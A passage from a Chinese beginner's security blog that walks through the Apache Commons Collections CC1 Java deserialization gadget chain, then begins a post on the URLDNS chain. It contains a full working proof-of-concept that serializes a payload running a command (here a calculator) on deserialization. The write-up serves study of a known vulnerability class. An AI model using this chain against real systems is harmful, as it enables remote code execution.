class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402185116469.png" alt="image-20240402185116469"></p><p>断点打在AnnotationInvocationHandler的readObject里，我们发现这里它annotationType &#x3D; AnnotationType.getInstance(type); 就是我们传入的注释，也就是Overried。</p><p>然后Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();</p><p>获取了注释里的值。这里是Overried里的值。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402185228264.png" alt="image-20240402185228264"></p><p>但是Override里的值是空的。所以下面的if判断里的memberType是空，就根本没进去。所以我们需要把Override换一个有值的注释。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402185256151.png" alt="image-20240402185256151"></p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402185352881.png" alt="image-20240402185352881"></p><p>Target是有值的，那么我们就把Override换成Target。</p><p>但是我们执行后发现这里的memberType还是空的。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402185736360.png" alt="image-20240402185736360"></p><p>我们注意分析分析代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>Class&lt;?&gt; memberType = memberTypes.get(name);<br><span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;&#125;<br></code></pre></td></tr></table></figure><p>这里的memberValue其实是我们传入map的键值对。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402190433766.png" alt="image-20240402190433766"></p><p>这里的name是在memberValue里找键值对里的键（这里就是key）。然后第二行，在memberTypes里看看有没有这个键，有就让memberType赋值，就不是空了。</p><p>我们刚刚改过，memberTypes &#x3D; annotationType.memberTypes();这里的memberTypes的值其实是我们传入注释里的值，我们刚刚看Target注释里的值是value。所以我们需要memberValue里键值对里的键的值是value即可。</p><p>所以，我们只需要把inmap.put(“key”,”value”);改成inmap.put(“value”,”aaa”);即可。</p><p>第二个if判断键值对是否能强转，不能强转就进入。我们这里是强转不了的，所以直接进入了。</p><hr style="border: 1px solid black;"/><h4 id="setValue里的value不可控的问题"><a href="#setValue里的value不可控的问题" class="headerlink" title="setValue里的value不可控的问题"></a>setValue里的value不可控的问题</h4><p>其实Transformer里还有一个类，是叫ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;              <span class="hljs-comment">//接受一个对象</span><br>    <span class="hljs-built_in">super</span>();<br>    iConstant = constantToReturn;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">return</span> iConstant;                   <span class="hljs-comment">//返回接受的对象</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以，我们只需要在最后那个点调用的是它的transform方法，传入我们最开始的传入对象Runtime.class无论中间有什么修饰变化，它最后返回Runtime.class，然后传给InvokerTransformer反射调用来rce了。</p><p>他同样是Transformer里的，所以我们可以一并写进Transformer数组里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><h1 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//Map类的构建与修饰</span><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        inmap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-comment">//遍历map，触发链子</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);<br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Target.class,outmap);<br>        serialize(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码生产一个名为serialize的序列化文件。</p><p>我们反序列化触发一下试试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arge)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    unserialize(<span class="hljs-string">&quot;serialize&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240402192338349.png" alt="image-20240402192338349"></p><p>弹计算器了！</p><p>至此，我们的Apache Commons Collections 反序列化1链终于完成了！（鼓掌）</p><hr style="border: 1px solid black;"/><h1 id="链子思路"><a href="#链子思路" class="headerlink" title="链子思路"></a>链子思路</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">AnnotationInvocationHandler类<br>-&gt; readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span> setValue()<br><br>TransformedMap类<br>-&gt; MapEntry类<br>-&gt;checkSetValue<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span> setValue()<br><br>ChainedTransformer类<br>-&gt; transform<span class="hljs-function"><span class="hljs-params">(Transformers[])</span></span><br><span class="hljs-function">-&gt;</span> ConstantTransformer类<br>-&gt; transform(Runtime.<span class="hljs-keyword">class</span>)<br><br>InvokerTransformer类<br>-&gt; transform<span class="hljs-function"><span class="hljs-params">(Runtime.<span class="hljs-keyword">class</span>)</span></span><br><span class="hljs-function">-&gt;</span> getClass<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span> getMethod<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span> invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>exec()<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>由于周一周二我满课&#x3D;-&#x3D;，这篇文章只有下午六点下课了才能写一写，加上我周天学习CC1链的那天，总共花费了三天时间。这三天相当与每天都复习了一遍链子的思路和写法，感觉很神奇，这种到底是怎么发现的呢&#x3D;-&#x3D;</p><p>刚开始学java反序列化还要下大功夫，因为很难，我也很笨学得慢，大师傅讲的CC1链50分钟的视频我来回看了三遍才看懂。有了一点心得体会想要写到博客分享给大家。</p><p>作为初学者，最了解初学者の痛。我想尽量完善这篇文章，写的尽量详细，让我自己和所有刚开始学java安全的小白师傅们都有个愉快的开始。</p><p>最后的最后，附上我最开始写的，虽杂乱无章，却又珍贵无比的 <strong>代码X笔记</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        Runtime r = Runtime.getRuntime();  //Runtime类是不能序列化的，需要反射，它的Class可以，从16行到44行是为了序列化的操作</span><br><span class="hljs-comment">//        Class c = r.getClass();</span><br><span class="hljs-comment">//        Method method = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        method.invoke(r,&quot;mate-calc&quot;);</span><br><br><span class="hljs-comment">//        Class c = Runtime.class;       //拿到Runtime的class</span><br><span class="hljs-comment">//        Method getRuntime = c.getMethod(&quot;getRuntime&quot;,null);   //null是因为getRuntime是无参方法</span><br><span class="hljs-comment">//        Runtime r = (Runtime) getRuntime.invoke(null,null);     //等于 Runtime r = Runtime.getRuntime();</span><br><span class="hljs-comment">//        Method exec = c.getMethod(&quot;exec&quot;,String.class);     //sting是exec的参数</span><br><span class="hljs-comment">//        exec.invoke(r,&quot;mate-calc&quot;);//执行命令</span><br><br><br>        <span class="hljs-comment">//弄清楚InvokerTransformer是怎么执行命令的，参数是那些？</span><br>        <span class="hljs-comment">//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;mate-calc&quot;&#125;);</span><br><br><span class="hljs-comment">//        Method getRuntime = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class); //相当于21 22两行</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);  //相当于23行</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;mate-calc&quot;&#125;).transform(r);</span><br><br>        <span class="hljs-comment">//利用ChainedTransformer合并transformers,上面三行递归调用，合并就不用了</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);    //传最开始的输入</span><br><br><br><br><br>        <span class="hljs-comment">//TransformedMap-&gt;decorate方法(Map map, Transformer keyTransformer, Transformer valueTransformer)</span><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        inmap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);     <span class="hljs-comment">//这里还要好好看看。</span><br>        <span class="hljs-comment">//protected Object checkSetValue(Object value) &#123;</span><br>        <span class="hljs-comment">//        return valueTransformer.transform(value);</span><br>        <span class="hljs-comment">//    &#125;</span><br>        <span class="hljs-comment">//只要遍历了被修饰过的map，就能走到setValue方法(传进去的value是Runtime.getRuntime()对象)-&gt;checkSetValue()</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,chainedTransformer);<br>        <span class="hljs-comment">//AnnotationLnvocationHandler里的readObject里有遍历map的方法</span><br>        <span class="hljs-comment">//这个是default的类，需要反射获取</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);       <span class="hljs-comment">//反射获取类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);     <span class="hljs-comment">//获取构造器，因为构造器也不是共有的，所以要用getDeclaredConstructor</span><br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//确保它可以访问</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Target.class,outmap);  <span class="hljs-comment">//实例化它，第一个参数是注解，第二个参数是map</span><br>        serialize(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化——URLDNS链</title>
    <link href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/"/>
    <url>/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87.png" alt="图片.png"></p><p>而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(1).png" alt="图片.png"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(2).png" alt="图片.png"></p><p>而在这个方法里，会执行getHostAddress方法，这是根据域名解析IP地址的函数。</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(3).png" alt="图片.png"></p><p>结合DNS的相关知识，也就是说只要走到这个函数，就一定会发出DNS请求。</p><p>同样的，hashMap类也实现了序列化接口，<img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(4).png" alt="图片.png"></p><p>在hashMap类也重写了readObject，里面也调用了hashCode方法，也就会发出DNS请求。</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(5).png" alt="图片.png"></p><p>所以链子是这样的：</p><p>new hashMap—&gt;hashmap.put(new URL(“这里放url”),1)—&gt;serialize—&gt;unserialize发出DNS请求</p><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>但是这样写有个问题，运行代码后发现只有在序列化的时候收到了一次DNS请求，而在反序列化的时候反而收不到DNS请求，这是因为hashMap.put方法里同样也调用了hash方法：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328111827604.png" alt="image-20240328112125969.png"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112125969.png" alt="image-20240328112136169.png"></p><p>如果不修改hashCode的值，那么我们传入的url就会触发DNS请求，并被hash编码，此后并不能触发反序列化。</p><h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>结合前面hashCode的-1判断，不难想到：如果能修改hashCode的值，那么就可以绕过put时hash的触发，而在put之后再把hashCode改回来，就完成整条链子了。</p><h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><p>我们可以通过反射，修改对象属性的值。</p><p>最后的链子就是：</p><p>new hashMap—&gt;X—&gt;hashmap.put(new URL(“填url”),1)—&gt;Y—&gt;serialize—&gt;unserialize发出DNS请求</p><p>X 为url.getClass()获取url类—&gt;getDeclaredField(“hashCode”)获取属性hashCode—&gt;set(url,1234)修改hashCode的值不为-1</p><p>Y 为set(url,-1)改回hashCode的值</p><h4 id="POC："><a href="#POC：" 